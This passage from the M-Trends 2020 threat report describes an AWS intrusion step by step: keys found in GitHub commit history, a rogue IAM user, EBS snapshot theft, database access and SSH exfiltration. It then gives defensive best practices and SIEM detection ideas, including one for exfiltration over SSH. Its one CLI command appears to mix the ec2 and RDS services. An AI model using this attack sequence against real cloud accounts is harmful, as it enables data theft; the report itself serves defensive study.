In one Mandiant Incident Response case, AWS access keys were compromised
from a GitHub repository and leveraged to access the victim’s AWS
environment.

First Stage: Targeting GitHub Repository
Investigations into the early stages of the attack suggested the attacker initially
obtained credentials to the victim’s GitHub code repository, which was not
protected by MFA. Once the attacker was able to gain access to the GitHub
repository with a known account, the attacker acquired a set of IAM user access
keys by searching the commit history. The IAM user access keys were used as
long-lived credentials for applications that interacted with and performed API
requests against AWS services in the victim’s environment.

Second Stage: Initial Access / Reconnaissance / Establish Foothold
After the attacker acquired the IAM access keys, they were able to access the
victim’s AWS environment using the AWS CLI from a virtual server located in
the Netherlands. The attacker then utilized the AWS CLI to interact with the
AWS environment (Table 2).

aws ec2 describe-db-instances

Third Stage: Maintain Presence / Move Laterally / Complete Mission
After performing reconnaissance and not finding information of interest, the
attacker provisioned a new IAM user account with both AWS Management
Console and programmatic access. This meant they no longer needed to rely on
the access key obtained from the GitHub repository. Shortly after authenticating to
the console, the attacker took snapshots of nine of the largest Elastic Block Store
(EBS) volumes within the AWS account. After successfully creating snapshots
of the large EBS volumes, the attacker proceeded to create a new EC2 instance,
mounted the snapshots, and attached an existing security policy to the EC2
instance that allowed inbound and outbound traffic on port 22.
The attacker then authenticated to the EC2 instance to review the contents of the
nine attached EBS volumes. Within an hour, the VPC flow logs recorded a large
volume of data being transferred via SSH to the virtual server in the Netherlands.
This was the first recorded high-volume data transfer via SSH, and it corresponded
to the first data theft by the attacker. Shortly after the data transfer, the EBS
snapshots were unmounted from the instance and deleted from the account.
The attacker then targeted the victim’s AWS Relational Database Service (RDS)
instances. Specifically, the attacker targeted the MySQL database containing
user credentials for a service provided by the victim organization. VPC flow logs
recorded traffic between the attacker’s EC2 instance and the RDS database. Again,
a high volume of data was transferred between the two systems, and subsequently
transferred to the virtual server in the Netherlands. This was consistent with the
attacker staging data on their EC2 instance and then transferring it to their server
in the Netherlands.
Once the attacker had successfully transferred the data, the attacker terminated
the EC2 instance. This removed valuable forensic artifacts because the EC2
instance was not recoverable. The attacker did not remove the attacker-created
credentials, which would have permitted them to access additional data in the
database or EBS volumes.

SPECIAL REPORT M-TRENDS 2020

Summary
AWS and other CSPs enable organizations to rapidly develop, scale and deploy
code and systems. Once an attacker obtains credentials to a cloud infrastructure,
the same tools that empower the organization also enable the attacker to rapidly
target and exploit cloud environments. The ability to access these cloud-native
tools also removes the need for sophisticated backdoors or custom tooling.
Everything the attacker needs is publicly accessible and provided by the CSP,
usually in the form of a CLI.

Common Weaknesses and Best Practices
MFA not enforced on GitHub repository user accounts or
for AWS IAM users
Pitfall Attackers target code repositories to gather pertinent information about a
corporation’s cloud or on-premise environment, and to obtain credentials. In at least
one case, multi-factor authentication was not enforced for the victim’s user accounts
on GitHub repository. The victim also had console password enabled for an IAM user
without enforcing MFA.

Best Practice Organizations should enforce MFA for all user accounts that have
access to code repositories and AWS accounts. Enabling and enforcing MFA will
enhance the overall security of these accounts and reduce the risk that an attacker
will be able to use a compromised account for nefarious activity. An organization
should disable any inactive IAM users until MFA is enabled.
The second factor may be a hard or soft token. Organizations should avoid using
second-factor mechanisms that are stored on the user’s PC. Instead, consider soft
tokens that are deployed onto mobile devices.
For additional hardening, organizations should require MFA not only for console
access, but also for CLI access. Organizations should restrict both console and CLI
access to known trusted IP ranges or IP addresses.

Long-lived IAM Credentials
Pitfall While long-lived IAM user credentials are used for application functionality,
such user access keys can increase the attack surface of an organization’s AWS
environment.

Best Practice Organizations should rotate IAM user access keys every 90 days to
limit attacker access to AWS. When developing an application, IAM roles should be
used to retrieve temporary credentials to interact with AWS resources within the
environment. AWS provides features to reduce the use of long-lived IAM credentials
for application purposes in their cloud platform. An organization should be using
IAM roles for EC2 instance profiles if they intend to have an application on an
EC2 instance interact with different AWS services, such as S3, Lambda functions,
Relational Database Service.
Using IAM roles rather than IAM access keys to perform AWS API requests has
multiple benefits. Once transitioned, an organization’s AWS administrator will
not be required to rotate credentials, because the AWS EC2 service will pass
temporary credentials to the metadata service of the underlying EC2 instance.
AWS rotates the credentials in the EC2 metadata service every one to six hours.
As an added benefit, an organization can easily restrict which role an IAM user can
assign to an EC2 instance profile during the launch process to prevent the user
from gaining elevated privileges.

54

SPECIAL REPORT M-TRENDS 2020

Overly permissive IAM roles
Pitfall When IAM user accounts have an overly permissive IAM role, they are at
risk for both inadvertent or deliberate activity outside of their intended purpose or
scope. In at least one instance, a compromised account has been observed with the
Administrator Access policy attached, which granted full administrative access to
the AWS account.

Best Practice Organizations should follow the principle of least privilege
when assigning IAM users and roles. To abide by the principle of least privilege,
organizations should limit the number of users within the organization with an IAM
role that has administrative privileges. An organization should strive to reduce all
permanent privileged role assignments and conduct periodic entitlement reviews
on IAM users, roles and policies. AWS provides native services, such as AWS access
advisor to audit IAM roles for service access, assist with removal of unnecessary
permissions and set appropriate permissions across different environments.

Insufficient detection capabilities
Pitfall Organizations may have insufficient detection capabilities and SIEM use
cases established at the time of an incident.

Best Practice Organizations should develop SIEM use cases to help detect threats
impacting cloud assets and services. An organization should identify the most
common targeted threats impacting the AWS environment, and identify activity in
AWS that would be considered anomalous. The use cases should sufficiently cover a
variety of assets and services.

SIEM USE CASE EXAMPLES
• New IP address performing an anomalous amount of API activity outside an approved IP range and
performing reconnaissance commands on the AWS environment
• New IP address creating an IAM user with console and programmatic access
• Creating snapshots of large EBS volumes
• New IP address creating an EC2 instance and attaching security group
• Attachment of EBS volumes
• Data being exfiltrated over SSH
• New IP address and user accessing sensitive database

SPECIAL REPORT M-TRENDS 2020

55

Storing credentials in plaintext within a GitHub repository
Pitfall Organizations may not be scanning for exposed credentials or preventing
them from being committed to the GitHub code repository.

Best Practice Organizations should use a professional or open-source credential
scanning solution to monitor and prevent inadvertent exposure of credentials.
GitHub provides a professional token scanning solution that will analyze code for
exposed credentials. The GitHub token scanning service will allow an organization
to create regular expressions to match specific credential patterns and then alert
the user or security team after a credential has been committed.
GitHub Enterprise can create pre-receive hooks, which allow a script or credential
scanning tool to be executed before acceptance of the commit. An organization
can use these pre-receive hooks and webhooks to execute an open-source
tool such as “git-secrets” or “detect-secrets” before allowing the commit, to
prevent any code containing an exposed secret from being accepted into a code
repository.

M-Trends 2020 Takeaways

While the threat landscape is evolving, new is not replacing old. Although we have
observed new malware families, many of these attackers are the usual suspects we
have seen over the years using familiar types of attack techniques with malware
based on a handful of known malware families.
And these threats and activities never stop. There are more active groups now
than ever before, with significant APT and FIN activity. These groups are using a
combination of custom intrusion tools and publicly available tools, typically in the
same parts of the attacker lifecycle.
While targeted industries and overall motivations have remained consistent, we are
seeing a marked expansion of threat actor goals, including new ways to monetize
intrusions and overall diversification in threat activity. This requires incident
responders to be prepared for more scenarios, both familiar and unfamiliar.
Perhaps most importantly is the good news: attacks are being detected and
responded to more quickly. The global median dwell time for 2019 was 56 days—
less than two months! Also of note: more victims were notified by an outside
party, reversing a four-year trend where more organizations were identifying
compromises on their own.
Many of the stats in M-Trends 2020 show that both the industry and
organizations are getting better at cyber security, but there is no single reason
why. Perhaps more vendors and more awareness are leading to better visibility
across the security spectrum. Or organizations are simply investing more in their
cyber security programs.

58

SPECIAL REPORT M-TRENDS 2020

One thing is for certain: cyber investments will fall short of achieving the desired
security outcomes if security staff are not properly trained. Security effectiveness
validation using purple team and red team exercises is one of the best ways for
organizations to evaluate and test their security. By going up against real-world
attackers, security teams can assess their own ability to detect and respond to an
active attacker scenario. Response readiness assessments and incident response
tabletop exercises also help improve preparedness. These exercises expose
executives, legal personnel and other staff to incident response processes and
concepts, and let participants know what actions they need to take during
a typical intrusion scenario.
And of course, FireEye will continue to publish M-Trends in the years to come, to
improve our collective security awareness, knowledge and capabilities.
